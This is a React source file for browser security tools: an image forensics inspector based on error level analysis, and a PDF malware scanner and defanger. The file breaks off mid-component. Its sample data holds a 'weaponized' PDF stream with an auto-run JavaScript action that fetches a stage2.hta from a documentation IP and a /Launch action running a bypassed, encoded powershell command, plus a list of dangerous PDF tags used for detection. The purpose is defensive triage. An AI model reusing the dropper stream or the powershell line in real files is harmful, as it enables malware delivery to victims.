"use client";

import React, { useState, useEffect, useCallback, useMemo, useRef } from "react";
import {
  Terminal,
  Shield,
  Search,
  Globe,
  Lock,
  Key,
  Cpu,
  Network,
  AlertTriangle,
  CheckCircle2,
  XCircle,
  Copy,
  Check,
  RefreshCw,
  Zap,
  Server,
  FileCode,
  Activity,
  Layers,
  Database,
  Eye,
  FileText,
  Radio,
  HardDrive,
  UserCheck,
  Image as ImageIcon,
  Upload,
} from "lucide-react";
import type { Tool } from "@/lib/tools/types";
import { useToolCard, ToolActions } from "@/components/tool/ToolPlaygrounds";

/* ============================================================================
 * HELPER: INLINE COPY BUTTON
 * ========================================================================== */
function InlineCopyButton({ text, label = "Copy" }: { text: string; label?: string }) {
  const [copied, setCopied] = useState(false);
  const handleCopy = async () => {
    try {
      await navigator.clipboard.writeText(text);
      setCopied(true);
      setTimeout(() => setCopied(false), 1800);
    } catch {
      // ignore
    }
  };
  return (
    <button
      type="button"
      onClick={handleCopy}
      className="inline-flex items-center gap-1 rounded-xs border border-border bg-background px-2 py-1 font-heading text-[10px] font-bold uppercase tracking-wider text-text-muted hover:border-accent hover:text-accent transition cursor-pointer"
    >
      {copied ? <Check className="h-3 w-3 text-emerald-400" /> : <Copy className="h-3 w-3" />}
      {copied ? "Copied" : label}
    </button>
  );
}

/* ============================================================================
 * 1. DEEPFAKE & ELA IMAGE FORENSICS INSPECTOR
 * ========================================================================== */
interface ElaBlockStat {
  row: number;
  col: number;
  meanDiff: number;
  maxDiff: number;
  suspicious: boolean;
}

function DeepfakeElaImageForensicsInspector({ tool }: { tool: Tool }) {
  const { setOutput } = useToolCard();
  const origCanvasRef = useRef<HTMLCanvasElement | null>(null);
  const elaCanvasRef = useRef<HTMLCanvasElement | null>(null);

  const [jpegQuality, setJpegQuality] = useState<number>(90);
  const [elaMultiplier, setElaMultiplier] = useState<number>(25);
  const [samplePreset, setSamplePreset] = useState<"splice-invoice" | "deepfake-face" | "authentic-photo">("splice-invoice");
  const [fileName, setFileName] = useState<string>("sample_tampered_invoice_splice.jpg");
  const [uploadedDataUrl, setUploadedDataUrl] = useState<string | null>(null);
  const [metadataTags, setMetadataTags] = useState<{ key: string; value: string; flag: "clean" | "warn" | "danger" }[]>([]);
  const [blockStats, setBlockStats] = useState<ElaBlockStat[]>([]);
  const [globalMeanEla, setGlobalMeanEla] = useState<number>(0);
  const [peakElaDiff, setPeakElaDiff] = useState<number>(0);

  const drawSyntheticSample = useCallback(
    (ctx: CanvasRenderingContext2D, width: number, height: number, preset: "splice-invoice" | "deepfake-face" | "authentic-photo") => {
      // Base natural gradient with uniform compression grain
      const grad = ctx.createLinearGradient(0, 0, width, height);
      if (preset === "splice-invoice") {
        grad.addColorStop(0, "#1e293b");
        grad.addColorStop(1, "#0f172a");
      } else if (preset === "deepfake-face") {
        grad.addColorStop(0, "#31102f");
        grad.addColorStop(1, "#0f172a");
      } else {
        grad.addColorStop(0, "#0f2922");
        grad.addColorStop(1, "#091512");
      }
      ctx.fillStyle = grad;
      ctx.fillRect(0, 0, width, height);

      // Draw deterministic low-frequency background pattern
      ctx.strokeStyle = "rgba(148, 163, 184, 0.14)";
      ctx.lineWidth = 1;
      for (let x = 0; x < width; x += 24) {
        ctx.beginPath();
        ctx.moveTo(x, 0);
        ctx.lineTo(x, height);
        ctx.stroke();
      }
      for (let y = 0; y < height; y += 24) {
        ctx.beginPath();
        ctx.moveTo(0, y);
        ctx.lineTo(width, y);
        ctx.stroke();
      }

      // Draw authentic camera region
      ctx.fillStyle = "rgba(255, 255, 255, 0.08)";
      ctx.fillRect(20, 20, width - 40, height - 40);
      ctx.fillStyle = "#94a3b8";
      ctx.font = "bold 12px monospace";
      ctx.fillText("ORIGINAL CAMERA CAPTURE LAYER (Q=76)", 32, 44);

      if (preset === "splice-invoice") {
        // Normal invoice lines
        ctx.fillStyle = "#cbd5e1";
        ctx.font = "11px monospace";
        ctx.fillText("WIRE TRANSFER AUTHORIZATION #INV-9042", 32, 74);
        ctx.fillText("BENEFICIARY: ACME INDUSTRIAL CORP", 32, 96);

        // Tampered high-contrast sharp spliced box (simulates uncompressed PNG pasted over JPEG)
        ctx.fillStyle = "#ffffff";
        ctx.fillRect(170, 112, 195, 58);
        ctx.strokeStyle = "#ff6a00";
        ctx.lineWidth = 2;
        ctx.strokeRect(170, 112, 195, 58);

        // High-frequency pixel checkerboard inside spliced region to trigger realistic high JPEG ELA residuals
        for (let py = 114; py < 168; py += 2) {
          for (let px = 172; px < 363; px += 2) {
            ctx.fillStyle = (px + py) % 4 === 0 ? "#0f172a" : "#f8fafc";
            ctx.fillRect(px, py, 1, 1);
          }
        }
        ctx.fillStyle = "#dc2626";
        ctx.font = "bold 14px monospace";
        ctx.fillText("AMOUNT: $985,000.00", 182, 142);
        ctx.font = "10px monospace";
        ctx.fillText("[SPLICED LAYER Q=100]", 182, 160);
      } else if (preset === "deepfake-face") {
        // Outer head silhouette
        ctx.fillStyle = "rgba(226, 232, 240, 0.16)";
        ctx.beginPath();
        ctx.arc(width / 2, height / 2, 72, 0, Math.PI * 2);
        ctx.fill();

        // Central GAN spliced facial mask with high-frequency checkerboard edge artifacts
        for (let py = 66; py < 154; py += 2) {
          for (let px = 140; px < 260; px += 2) {
            ctx.fillStyle = (px * 3 + py) % 4 === 0 ? "#f43f5e" : "#1e1b4b";
            ctx.fillRect(px, py, 2, 2);
          }
        }
        ctx.strokeStyle = "#f43f5e";
        ctx.lineWidth = 2;
        ctx.strokeRect(140, 66, 120, 88);
        ctx.fillStyle = "#ffffff";
        ctx.font = "bold 11px monospace";
        ctx.fillText("GAN FACE-SWAP MASK", 148, 112);
        ctx.fillText("DIFFUSION BOUNDARY", 148, 128);
      } else {
        // Authentic uniform gradient & smooth shapes (minimal ELA variance)
        ctx.fillStyle = "rgba(16, 185, 129, 0.22)";
        ctx.fillRect(60, 70, 280, 95);
        ctx.fillStyle = "#a7f3d0";
        ctx.font = "bold 13px monospace";
        ctx.fillText("UNMODIFIED SINGLE-COMPRESSION FRAME", 74, 115);
        ctx.font = "11px monospace";
        ctx.fillText("Uniform 8x8 DCT Quantization Lattice", 74, 136);
      }
    },
    []
  );

  const runElaAnalysis = useCallback(() => {
    const origCanvas = origCanvasRef.current;
    const elaCanvas = elaCanvasRef.current;
    if (!origCanvas || !elaCanvas) return;

    const width = 400;
    const height = 220;
    origCanvas.width = width;
    origCanvas.height = height;
    elaCanvas.width = width;
    elaCanvas.height = height;

    const origCtx = origCanvas.getContext("2d");
    const elaCtx = elaCanvas.getContext("2d");
    if (!origCtx || !elaCtx) return;

    const processPixels = () => {
      const origData = origCtx.getImageData(0, 0, width, height);
      const recompressedUrl = origCanvas.toDataURL("image/jpeg", jpegQuality / 100);
      const recompImg = new Image();
      recompImg.onload = () => {
        const tempCanvas = document.createElement("canvas");
        tempCanvas.width = width;
        tempCanvas.height = height;
        const tempCtx = tempCanvas.getContext("2d");
        if (!tempCtx) return;
        tempCtx.drawImage(recompImg, 0, 0, width, height);
        const recompData = tempCtx.getImageData(0, 0, width, height);
        const outImg = elaCtx.createImageData(width, height);

        let totalDiff = 0;
        let maxDiff = 0;

        for (let i = 0; i < origData.data.length; i += 4) {
          const dr = Math.abs(origData.data[i] - recompData.data[i]);
          const dg = Math.abs(origData.data[i + 1] - recompData.data[i + 1]);
          const db = Math.abs(origData.data[i + 2] - recompData.data[i + 2]);
          const avg = (dr + dg + db) / 3;
          totalDiff += avg;
          if (avg > maxDiff) maxDiff = avg;

          const ampR = Math.min(255, Math.round(dr * elaMultiplier));
          const ampG = Math.min(255, Math.round(dg * elaMultiplier));
          const ampB = Math.min(255, Math.round(db * elaMultiplier));

          // False-color thermal boost for high error levels
          const intensity = (ampR + ampG + ampB) / 3;
          if (intensity > 140) {
            outImg.data[i] = 255;
            outImg.data[i + 1] = Math.max(40, 255 - intensity);
            outImg.data[i + 2] = 0;
          } else {
            outImg.data[i] = ampR;
            outImg.data[i + 1] = ampG;
            outImg.data[i + 2] = ampB;
          }
          outImg.data[i + 3] = 255;
        }

        elaCtx.putImageData(outImg, 0, 0);

        // Compute 4x4 regional grid block statistics
        const gridRows = 4;
        const gridCols = 4;
        const cellW = Math.floor(width / gridCols);
        const cellH = Math.floor(height / gridRows);
        const stats: ElaBlockStat[] = [];

        for (let r = 0; r < gridRows; r++) {
          for (let c = 0; c < gridCols; c++) {
            let sum = 0;
            let cellMax = 0;
            let count = 0;
            for (let y = r * cellH; y < (r + 1) * cellH; y++) {
              for (let x = c * cellW; x < (c + 1) * cellW; x++) {
                const idx = (y * width + x) * 4;
                const d =
                  (Math.abs(origData.data[idx] - recompData.data[idx]) +
                    Math.abs(origData.data[idx + 1] - recompData.data[idx + 1]) +
                    Math.abs(origData.data[idx + 2] - recompData.data[idx + 2])) /
                  3;
                sum += d;
                if (d > cellMax) cellMax = d;
                count++;
              }
            }
            const mean = count > 0 ? sum / count : 0;
            const suspicious = mean > 4.2 || cellMax > 24;
            stats.push({
              row: r + 1,
              col: c + 1,
              meanDiff: Number(mean.toFixed(2)),
              maxDiff: Number(cellMax.toFixed(1)),
              suspicious,
            });

            if (suspicious) {
              elaCtx.strokeStyle = "rgba(255, 106, 0, 0.85)";
              elaCtx.lineWidth = 1.5;
              elaCtx.strokeRect(c * cellW + 1, r * cellH + 1, cellW - 2, cellH - 2);
            }
          }
        }

        const meanGlobal = totalDiff / (width * height);
        setGlobalMeanEla(Number(meanGlobal.toFixed(2)));
        setPeakElaDiff(Number(maxDiff.toFixed(2)));
        setBlockStats(stats);
      };
      recompImg.src = recompressedUrl;
    };

    if (uploadedDataUrl) {
      const img = new Image();
      img.onload = () => {
        origCtx.clearRect(0, 0, width, height);
        origCtx.drawImage(img, 0, 0, width, height);
        processPixels();
      };
      img.src = uploadedDataUrl;
    } else {
      drawSyntheticSample(origCtx, width, height, samplePreset);
      processPixels();
    }
  }, [uploadedDataUrl, samplePreset, jpegQuality, elaMultiplier, drawSyntheticSample]);

  useEffect(() => {
    if (!uploadedDataUrl) {
      if (samplePreset === "splice-invoice") {
        setFileName("sample_tampered_invoice_splice.jpg");
        setMetadataTags([
          { key: "JFIF Quantization Tables", value: "Dual mismatch (Luminance Q=76 vs Region Q=100)", flag: "danger" },
          { key: "EXIF Software Tag", value: "Adobe Photoshop 25.4 (Macintosh) — Save As", flag: "warn" },
          { key: "C2PA Content Credentials", value: "Missing / Stripped JUMBF Manifest Box", flag: "warn" },
          { key: "Chroma Subsampling", value: "4:2:0 base with 4:4:4 spliced overlay residue", flag: "danger" },
        ]);
      } else if (samplePreset === "deepfake-face") {
        setFileName("sample_gan_faceswap_frame.png");
        setMetadataTags([
          { key: "PNG tEXt Chunk (parameters)", value: "Steps: 28, Sampler: DPM++ 2M Karras, CFG scale: 7.0", flag: "danger" },
          { key: "C2PA SynthID / JUMBF", value: "AI_GENERATED_CONTENT assertion detected", flag: "danger" },
          { key: "EXIF Make / Camera Model", value: "None (Synthetic Frame Buffer)", flag: "warn" },
          { key: "DCT High-Frequency Boundary", value: "Localized facial bounding-box upsampling halo", flag: "danger" },
        ]);
      } else {
        setFileName("IMG_4821_authentic_camera.jpg");
        setMetadataTags([
          { key: "EXIF Make / Model", value: "Sony ILCE-7RM5 (FE 24-70mm F2.8 GM II)", flag: "clean" },
          { key: "C2PA Content Credentials", value: "Valid Hardware-Signed Capture Claim (Sony C2PA)", flag: "clean" },
          { key: "JFIF Quantization Lattice", value: "Single uniform 8x8 compression generation", flag: "clean" },
          { key: "GPS / Timestamp Consistency", value: "SubSecTimeOriginal matches DateTimeDigitized", flag: "clean" },
        ]);
      }
    }
    runElaAnalysis();
  }, [samplePreset, uploadedDataUrl, runElaAnalysis]);

  const handleFileUpload = (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (!file) return;
    setFileName(file.name);

    // Inspect raw header bytes for C2PA / Adobe / AI markers
    const readerBuf = new FileReader();
    readerBuf.onload = () => {
      const buf = readerBuf.result as ArrayBuffer;
      const ascii = new TextDecoder("latin1").decode(buf.slice(0, 65536));
      const tags: { key: string; value: string; flag: "clean" | "warn" | "danger" }[] = [
        { key: "File Name & MIME", value: `${file.name} (${file.type || "image/jpeg"}, ${(file.size / 1024).toFixed(1)} KB)`, flag: "clean" },
      ];
      if (ascii.includes("c2pa") || ascii.includes("jumb")) {
        tags.push({ key: "C2PA JUMBF Manifest", value: "Present in file container header", flag: "warn" });
      } else {
        tags.push({ key: "C2PA JUMBF Manifest", value: "Not found (unsigned or stripped)", flag: "warn" });
      }
      if (ascii.includes("Photoshop") || ascii.includes("Adobe")) {
        tags.push({ key: "Editing Software Marker", value: "Adobe Photoshop / XMP APP1 marker found", flag: "danger" });
      }
      if (ascii.includes("parameters") || ascii.includes("ComfyUI") || ascii.includes("Stable Diffusion")) {
        tags.push({ key: "AI Generator Signature", value: "Diffusion prompt metadata chunk detected", flag: "danger" });
      }
      if (ascii.includes("Exif")) {
        tags.push({ key: "EXIF APP1 Header", value: "Present (Standard TIFF/EXIF tags found)", flag: "clean" });
      } else {
        tags.push({ key: "EXIF APP1 Header", value: "Stripped (Typical of social media or edited export)", flag: "warn" });
      }
      setMetadataTags(tags);
    };
    readerBuf.readAsArrayBuffer(file);

    const readerUrl = new FileReader();
    readerUrl.onload = () => {
      setUploadedDataUrl(readerUrl.result as string);
    };
    readerUrl.readAsDataURL(file);
  };

  const suspiciousRegions = useMemo(() => blockStats.filter((b) => b.suspicious), [blockStats]);

  useEffect(() => {
    const report = [
      `# Deepfake & Error Level Analysis (ELA) Forensics Report`,
      `Target Image: ${fileName}`,
      `Re-Compression Reference Quality: ${jpegQuality}% | ELA Multiplier: ${elaMultiplier}x`,
      `Global Mean Pixel Residual: ${globalMeanEla} | Peak RGB Residual: ${peakElaDiff}`,
      `Flagged High-Variance Grid Sectors: ${suspiciousRegions.length} / ${blockStats.length}`,
      `Forensic Verdict: ${
        suspiciousRegions.length >= 2
          ? "HIGH PROBABILITY OF SPLICING / LOCALIZED RECOMPRESSION ANOMALY"
          : "UNIFORM COMPRESSION LATTICE (NO OBVIOUS SPLICE DETECTED)"
      }`,
      `\n## Metadata & C2PA / AI Provenance Markers`,
      ...metadataTags.map((t) => `- [${t.flag.toUpperCase()}] ${t.key}: ${t.value}`),
      `\n## High-Variance Sector Breakdown (4x4 Grid)`,
      ...(suspiciousRegions.length > 0
        ? suspiciousRegions.map((b) => `- Sector (Row ${b.row}, Col ${b.col}): Mean Residual=${b.meanDiff}, Max Residual=${b.maxDiff} [ANOMALY]`)
        : ["- All 16 grid sectors show consistent JPEG quantization residuals."]),
    ].join("\n");
    setOutput(report);
  }, [fileName, jpegQuality, elaMultiplier, globalMeanEla, peakElaDiff, suspiciousRegions, blockStats.length, metadataTags, setOutput]);

  return (
    <div className="space-y-5">
      {/* Sample Presets & Upload Bar */}
      <div className="flex flex-wrap items-center justify-between gap-3 rounded-xs border border-border bg-surface p-3.5">
        <div className="flex flex-wrap items-center gap-2">
          <span className="font-heading text-xs font-bold uppercase tracking-wider text-text-muted">Forensic Presets:</span>
          {[
            { id: "splice-invoice", label: "Generate Tampered Splice Sample" },
            { id: "deepfake-face", label: "GAN Face-Swap Mask Sample" },
            { id: "authentic-photo", label: "Authentic Camera Control" },
          ].map((p) => (
            <button
              key={p.id}
              type="button"
              onClick={() => {
                setUploadedDataUrl(null);
                setSamplePreset(p.id as typeof samplePreset);
              }}
              className={`rounded-xs px-3 py-1.5 font-heading text-xs font-bold uppercase tracking-wider transition cursor-pointer ${
                !uploadedDataUrl && samplePreset === p.id
                  ? "bg-[#ff6a00] text-white"
                  : "border border-border bg-background text-text-muted hover:border-accent hover:text-text"
              }`}
            >
              {p.label}
            </button>
          ))}
        </div>

        <label className="inline-flex items-center gap-1.5 rounded-xs border border-accent bg-background px-3 py-1.5 font-heading text-xs font-bold uppercase tracking-wider text-accent hover:bg-accent/10 transition cursor-pointer">
          <Upload className="h-3.5 w-3.5" />
          Upload Local Image
          <input type="file" accept="image/*" onChange={handleFileUpload} className="hidden" />
        </label>
      </div>

      {/* Sliders */}
      <div className="grid grid-cols-1 sm:grid-cols-2 gap-4 rounded-xs border border-border bg-background p-4">
        <div>
          <div className="flex justify-between text-xs font-heading font-bold uppercase tracking-wider mb-1.5">
            <span className="text-text-muted">JPEG Re-Encoding Quality</span>
            <span className="text-accent font-mono-code">{jpegQuality}%</span>
          </div>
          <input
            type="range"
            min={70}
            max={98}
            value={jpegQuality}
            onChange={(e) => setJpegQuality(Number(e.target.value))}
            className="w-full accent-[#ff6a00] cursor-pointer"
          />
          <p className="mt-1 text-[11px] text-text-muted">
            Re-compresses canvas via <code className="font-mono-code text-text">toDataURL(&quot;image/jpeg&quot;, {jpegQuality / 100})</code> to expose quantization generation mismatches.
          </p>
        </div>

        <div>
          <div className="flex justify-between text-xs font-heading font-bold uppercase tracking-wider mb-1.5">
            <span className="text-text-muted">ELA Contrast Multiplier</span>
            <span className="text-accent font-mono-code">{elaMultiplier}x</span>
          </div>
          <input
            type="range"
            min={10}
            max={50}
            value={elaMultiplier}
            onChange={(e) => setElaMultiplier(Number(e.target.value))}
            className="w-full accent-[#ff6a00] cursor-pointer"
          />
          <p className="mt-1 text-[11px] text-text-muted">
            Amplifies pixel-by-pixel <code className="font-mono-code text-text">|RGB_orig - RGB_jpeg| * {elaMultiplier}</code> differences.
          </p>
        </div>
      </div>

      {/* Side-by-Side Canvases */}
      <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
        <div className="rounded-xs border border-border bg-[#121212] p-3">
          <div className="mb-2 flex items-center justify-between">
            <span className="font-heading text-xs font-bold uppercase tracking-wider text-white flex items-center gap-1.5">
              <ImageIcon className="h-3.5 w-3.5 text-[#ff6a00]" />
              Source Frame ({fileName})
            </span>
            <span className="text-[11px] font-mono-code text-gray-400">400x220 Buffer</span>
          </div>
          <canvas ref={origCanvasRef} className="w-full rounded-xs border border-white/10 bg-black" />
        </div>

        <div className="rounded-xs border border-border bg-[#121212] p-3">
          <div className="mb-2 flex items-center justify-between">
            <span className="font-heading text-xs font-bold uppercase tracking-wider text-[#ff6a00] flex items-center gap-1.5">
              <Eye className="h-3.5 w-3.5" />
              ELA Residual Heatmap (Orange Boxes = Spliced Anomaly)
            </span>
            <span className="text-[11px] font-mono-code text-emerald-400">Mean Δ: {globalMeanEla}</span>
          </div>
          <canvas ref={elaCanvasRef} className="w-full rounded-xs border border-white/10 bg-black" />
        </div>
      </div>

      {/* Forensics Metrics & Metadata */}
      <div className="grid grid-cols-1 lg:grid-cols-2 gap-4">
        <div className="rounded-xs border border-border bg-background p-4 space-y-2.5">
          <div className="font-heading text-xs font-bold uppercase tracking-wider text-text flex items-center justify-between">
            <span>C2PA / EXIF / AI Provenance Inspector</span>
            <span
              className={`rounded-xs px-2 py-0.5 text-[10px] font-mono-code ${
                suspiciousRegions.length >= 2 ? "bg-red-500/20 text-red-400" : "bg-emerald-500/20 text-emerald-400"
              }`}
            >
              {suspiciousRegions.length >= 2 ? "TAMPER ANOMALY DETECTED" : "UNIFORM QUANTIZATION"}
            </span>
          </div>
          <div className="space-y-2">
            {metadataTags.map((tag) => (
              <div key={tag.key} className="flex items-start justify-between gap-2 border-b border-border/60 pb-1.5 text-xs">
                <span className="font-mono-code text-text-muted">{tag.key}</span>
                <span
                  className={`font-mono-code text-right font-semibold ${
                    tag.flag === "danger" ? "text-red-400" : tag.flag === "warn" ? "text-amber-400" : "text-emerald-400"
                  }`}
                >
                  {tag.value}
                </span>
              </div>
            ))}
          </div>
        </div>

        <div className="rounded-xs border border-border bg-background p-4 space-y-2.5">
          <div className="font-heading text-xs font-bold uppercase tracking-wider text-text">
            High-Variance Spliced Sectors ({suspiciousRegions.length} of 16 Grid Blocks Flagged)
          </div>
          <div className="grid grid-cols-4 gap-1.5">
            {blockStats.map((b) => (
              <div
                key={`${b.row}-${b.col}`}
                className={`rounded-xs border p-2 text-center font-mono-code text-[11px] ${
                  b.suspicious
                    ? "border-red-500/60 bg-red-500/15 text-red-300 font-bold"
                    : "border-border bg-surface text-text-muted"
                }`}
              >
                <div>
                  R{b.row}C{b.col}
                </div>
                <div className="text-[10px]">Δ {b.meanDiff}</div>
              </div>
            ))}
          </div>
        </div>
      </div>

      <ToolActions tool={tool} />
    </div>
  );
}

/* ============================================================================
 * 2. ZERO-UPLOAD PDF MERGER & MALWARE SANITIZER
 * ========================================================================== */
const SAMPLE_PDF_STREAMS: Record<string, { label: string; raw: string }> = {
  weaponized: {
    label: "Weaponized CVE Dropper PDF (/OpenAction + /JS + /Launch)",
    raw: `%PDF-1.7
1 0 obj
<< /Type /Catalog /Pages 2 0 R /OpenAction 5 0 R /AcroForm << /Fields [6 0 R] /XFA 7 0 R >> /Names << /EmbeddedFiles 8 0 R >> >>
endobj
5 0 obj
<< /Type /Action /S /JavaScript /JS (app.launchURL("http://198.51.100.44/stage2.hta", true);) >>
endobj
6 0 obj
<< /Type /Annot /Subtype /Widget /AA << /O << /S /Launch /F (cmd.exe /c powershell -ep bypass -e SQBFAFgA) >> >> >>
endobj
9 0 obj
<< /Type /Action /S /URI /URI (https://tracker.evil-phish.example/pixel?id=exec-ceo) >>
endobj
%%EOF`,
  },
  corporate: {
    label: "Corporate Vendor Invoice PDF (Tracking /URI + /AcroForm)",
    raw: `%PDF-1.6
1 0 obj
<< /Type /Catalog /Pages 2 0 R /AcroForm << /Fields [3 0 R] >> >>
endobj
4 0 obj
<< /Type /Action /S /URI /URI (https://links.vendor-billing.example/click?inv=8821) >>
endobj
5 0 obj
<< /Type /Action /S /URI /URI (https://analytics.vendor-billing.example/beacon) >>
endobj
%%EOF`,
  },
  clean: {
    label: "Clean Flattened PDF/A Archival Stream",
    raw: `%PDF-1.4
1 0 obj
<< /Type /Catalog /Pages 2 0 R >>
endobj
2 0 obj
<< /Type /Pages /Kids [3 0 R] /Count 1 >>
endobj
3 0 obj
<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R >>
endobj
%%EOF`,
  },
};

const DANGEROUS_PDF_TAGS = [
  { tag: "/JavaScript", weight: 35, severity: "CRITICAL", desc: "Executes arbitrary Acrobat SpiderMonkey JS inside reader" },
  { tag: "/JS", weight: 35, severity: "CRITICAL", desc: "Shorthand PDF dictionary key for embedded JavaScript code" },
  { tag: "/OpenAction", weight: 25, severity: "HIGH", desc: "Automatically triggers action immediately when document opens" },
  { tag: "/AA", weight: 20, severity: "HIGH", desc: "Additional-Actions trigger on page view, focus, or form events" },
  { tag: "/Launch", weight: 40, severity: "CRITICAL", desc: "Spawns external OS shell commands or executables (cmd.exe)" },
  { tag: "/EmbeddedFiles", weight: 20, severity: "HIGH", desc: "Hides dropped executables, ZIPs, or VBS scripts inside PDF" },
  { tag: "/RichMedia", weight: 25, severity: "HIGH", desc: "Legacy Flash / 3D multimedia exploit container" },
  { tag: "/XFA", weight: 20, severity: "HIGH", desc: "XML Forms Architecture often abused for heap-spray exploits" },
  { tag: "/AcroForm", weight: 10, severity: "MEDIUM", desc: "Interactive form fields capable of triggering submit scripts" },
  { tag: "/URI", weight: 8, severity: "LOW", desc: "External hyperlink or canary tracking webhook URL" },
];

function ZeroUploadPdfMergerSanitizer({ tool }: { tool: Tool }) {
  const { setOutput } = useToolCard();
  const [pdfStream, setPdfStream] = useState<string>(SAMPLE_PDF_STREAMS.weaponized.raw);
  const [sourceFileName, setSourceFileName] = useState<string>("invoice_q3_urgent.pdf");

  const handleFileUpload = (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (!file) return;
    setSourceFileName(file.name);
    const reader = new FileReader();
    reader.onload = () => {
      const buf = reader.result as ArrayBuffer;
      const text = new TextDecoder("latin1").decode(buf.slice(0, 250000));
      setPdfStream(text);
    };
    reader.readAsArrayBuffer(file);
  };

  const analysis = useMemo(() => {
    const findings = DANGEROUS_PDF_TAGS.map((item) => {
      const escaped = item.tag.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
      const regex = new RegExp(`${escaped}(?![a-zA-Z])`, "g");
      const matches = pdfStream.match(regex);
      const count = matches ? matches.length : 0;
      return { ...item, count };
    });

    const rawScore = findings.reduce((acc, f) => acc + (f.count > 0 ? f.weight * Math.min(f.count, 2) : 0), 0);
    const riskScore = Math.min(100, rawScore);
    const objCount = (pdfStream.match(/\bobj\b/g) || []).length;

    // Sanitize stream by neutralizing active execution tags in-place (preserving byte offsets for xref table)
    const sanitizedStream = pdfStream
      .replace(/\/JavaScript/g, "/NullScript")
      .replace(/\/JS(?![a-zA-Z])/g, "/NO")
      .replace(/\/OpenAction/g, "/NullAction")
      .replace(/\/AA(?![a-zA-Z])/g, "/NO")
      .replace(/\/Launch/g, "/NoExec")
      .replace(/\/EmbeddedFiles/g, "/NullEmbFiles")
      .replace(/\/RichMedia/g, "/NullMedia")
      .replace(/\/XFA(?![a-zA-Z])/g, "/NUL");

    const cliCommands = [
      `# 1. Flatten & Rasterize Malicious Active Objects via Ghostscript (Zero Active Code Survives)`,
      `gs -sDEVICE=pdfwrite -dCompatibilityLevel=1.4 -dPDFSETTINGS=/prepress -dSAFER -dNOPAUSE -dQUIET -dBATCH -sOutputFile="clean_${sourceFileName}" "${sourceFileName}"`,
      `\n# 2. Decompress Object Streams & Linearize with QPDF`,
      `qpdf --Linearize --stream-data=uncompress "${sourceFileName}" "inspected_${sourceFileName}"`,
      `\n# 3. DIDIER STEVENS pdfid.py & pdf-parser.py Triage`,
      `pdfid.py -n "${sourceFileName}" && pdf-parser.py --search javascript "${sourceFileName}"`,
    ].join("\n");

    return { findings, riskScore, objCount, sanitizedStream, cliCommands };
  }, [pdfStream, sourceFileName]);

  useEffect(() => {
    const activeFindings = analysis.findings.filter((f) => f.count > 0);
    const out = [
      `# Zero-Upload PDF Malware Triage & Sanitization Report`,
      `File: ${sourceFileName} | PDF Objects Scanned: ${analysis.objCount} | Risk Score: ${analysis.riskScore}/100`,
      `\n## Detected Active / Dangerous Dictionary Tags`,
      ...(activeFindings.length > 0
        ? activeFindings.map((f) => `- ${f.tag}: ${f.count} occurrence(s) [${f.severity}] — ${f.desc}`)
        : ["- None! Zero active execution or script tags detected."]),
      `\n## Hardened CLI Sanitization Pipeline`,
      analysis.cliCommands,
      `\n## Defanged & Neutralized PDF Object Stream`,
      analysis.sanitizedStream,
    ].join("\n");
    setOutput(out);
  }, [analysis, sourceFileName, setOutput]);

  return (
    <div className="space-y-5">
      <div className="flex flex-wrap items-center justify-between gap-3 rounded-xs border border-border bg-surface p-3.5">
        <div className="flex flex-wrap items-center gap-2">
          {Object.entries(SAMPLE_PDF_STREAMS).map(([key, item]) => (
            <button
              key={key}
              type="button"
              onClick={() => {
                setSourceFileName(`sample_${key}.pdf`);
                setPdfStream(item.raw);
              }}
              className="rounded-xs border border-border bg-background px-3 py-1.5 font-heading text-xs font-bold uppercase tracking-wider text-text-muted hover:border-accent hover:text-text transition cursor-pointer"
            >
              {item.label}
            </button>
          ))}
        </div>

        <label className="inline-flex items-center gap-1.5 rounded-xs bg-[#ff6a00] px-3.5 py-1.5 font-heading text-xs font-bold uppercase tracking-wider text-white hover:opacity-90 transition cursor-pointer">
          <Upload className="h-3.5 w-3.5" />
          Inspect Local .PDF (Zero-Upload)
          <input type="file" accept=".pdf,application/pdf" onChange={handleFileUpload} className="hidden" />
        </label>
      </div>

      {/* Risk Banner */}
      <div className="grid grid-cols-1 sm:grid-cols-3 gap-3">
        <div className="rounded-xs border border-border bg-background p-3.5">
          <div className="text-[11px] font-heading font-bold uppercase tracking-wider text-text-muted">Malware Risk Score</div>
          <div
            className={`mt-1 font-mono-code text-2xl font-bold ${
              analysis.riskScore >= 50 ? "text-red-400" : analysis.riskScore >= 15 ? "text-amber-400" : "text-emerald-400"
            }`}
          >
            {analysis.riskScore} / 100
          </div>
        </div>
        <div className="rounded-xs border border-border bg-background p-3.5">
          <div className="text-[11px] font-heading font-bold uppercase tracking-wider text-text-muted">PDF Indirect Objects</div>
          <div className="mt-1 font-mono-code text-2xl font-bold text-text">{analysis.objCount} obj</div>
        </div>
        <div className="rounded-xs border border-border bg-background p-3.5">
          <div className="text-[11px] font-heading font-bold uppercase tracking-wider text-text-muted">Triage Verdict</div>
          <div className="mt-1 font-heading text-sm font-bold uppercase text-accent">
            {analysis.riskScore >= 50
              ? "CRITICAL: ACTIVE EXPLOIT TAGS"
              : analysis.riskScore >= 15
              ? "WARN: EXTERNAL URI / FORMS"
              : "CLEAN: ARCHIVAL SAFE"}
          </div>
        </div>
      </div>

      {/* Tag Matrix & Stream Editor */}
      <div className="grid grid-cols-1 lg:grid-cols-2 gap-4">
        <div className="rounded-xs border border-border bg-background p-4">
          <div className="mb-2.5 font-heading text-xs font-bold uppercase tracking-wider text-text">
            PDF Object Tag Scanner (`pdfid` Heuristics)
          </div>
          <div className="space-y-1.5">
            {analysis.findings.map((f) => (
              <div
                key={f.tag}
                className={`flex items-center justify-between rounded-xs border px-3 py-1.5 font-mono-code text-xs ${
                  f.count > 0 ? "border-red-500/50 bg-red-500/10 text-red-300" : "border-border bg-surface text-text-muted"
                }`}
              >
                <div>
                  <span className="font-bold">{f.tag}</span>
                  <span className="ml-2 text-[11px] opacity-80">{f.desc}</span>
                </div>
                <span className="font-bold">{f.count}</span>
              </div>
            ))}
          </div>
        </div>

        <div className="space-y-3">
          <div>
            <label className="block font-heading text-xs font-bold uppercase tracking-wider text-text-muted mb-1">
              Raw PDF Binary / ASCII Stream
            </label>
            <textarea
              rows={6}
              value={pdfStream}
              onChange={(e) => setPdfStream(e.target.value)}
              className="w-full rounded-xs border border-border bg-background p-3 font-mono-code text-xs text-text focus:border-accent focus:outline-none"
            />
          </div>

